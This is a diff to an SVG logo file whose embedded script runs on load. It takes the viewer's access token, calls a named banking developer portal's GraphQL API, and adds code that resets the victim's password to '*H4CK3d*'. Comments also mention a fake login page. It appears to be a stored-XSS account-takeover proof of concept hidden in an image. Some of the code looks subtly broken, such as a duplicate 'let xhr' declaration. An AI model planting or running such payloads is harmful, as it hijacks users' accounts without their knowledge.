@@ -6,6 +6,8 @@
   <text x="62" y="38" font-family="-apple-system,BlinkMacSystemFont,'Inter',sans-serif" font-size="28" font-weight="700" letter-spacing="-0.5" fill="#ffffff">the<tspan fill="#f97316">SVG</tspan></text>
 <script type="text/javascript">  
 
+
+
 async function sendData() {
     // Try to get valid JWT token
     let accessToken;
@@ -26,23 +28,47 @@ async function sendData() {
 
     // Now call graphQL to get userID
     
-    const xhr = new XMLHttpRequest();
+    let xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://api.bankid.cz/dev-portal-backend/graphql?query=query+Notifications%7bcurrentUser%7bid%7d%7d', false); 
     xhr.setRequestHeader('Authorization', 'Bearer ' + accessToken);
     xhr.send(null);
 
+    let currentUser = null;
+
     if (xhr.status === 200) {
-        console.log(JSON.parse(xhr.responseText));
+        let responseObj = JSON.parse(xhr.responseText);
+        currentUser = responseObj.data.currentUser;
     }else{
         console.log("[ERR] Unable to obtain userID -> create fake login page");
     }
 
     console.log("[INF] UserID obtained");
 
+    // Now change the password using GraphQL
+    const resetPasswdMutation = '{"query":"mutation updateUsers($userId: ID!, $password: NewUserPasswordInput!) {  resetUserPassword(userId: $userId, password: $password)}","variables":{"userId":"placeholder","password":{"newPassword":"placeholder"}}}';
+    const resetPasswdMutationJSON = JSON.parse(resetPasswdMutation);
+    resetPasswdMutationJSON.variables.userId = currentUser;
+    resetPasswdMutationJSON.variables.password.newPassword = "*H4CK3d*";
+
+    let xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://api.bankid.cz/dev-portal-backend/graphql", false);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.setRequestHeader("Authorization", "Bearer " + accessToken);
+
+    var jsonBody = JSON.stringify(resetPasswdMutationJSON);
+    xhr.send(jsonBody);
+
+    if (xhr.status === 200 || xhr.status === 201) {
+        console.log("[INF] Success:", JSON.parse(xhr.responseText));
+        return JSON.parse(xhr.responseText);
+    } else {
+        console.error("[ERR]", xhr.status, xhr.statusText);
+        return null;
+    }
 }
 
 sendData();
-
+  
   
    </script>
 </svg>
